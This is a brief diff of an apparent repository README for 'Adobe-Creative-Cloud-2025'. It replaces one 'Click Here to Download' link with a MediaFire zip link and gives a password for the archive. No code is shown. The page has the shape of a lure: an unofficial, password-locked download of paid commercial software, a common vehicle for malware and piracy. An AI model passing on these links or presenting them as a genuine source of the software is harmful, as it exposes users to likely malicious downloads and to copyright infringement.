@@ -1,5 +1,5 @@
 # Adobe-Creative-Cloud-2025
-[Click Here to Download](https://rdmfile.eu/install/M9FNTZYINneB)
+[Click Here to Download](https://www.mediafire.com/file/xaqyxgwkde77yo6/Adobe_Creative_Cloud_2025.zip/file)
 
 [Pass : S0f4fr33!]
 
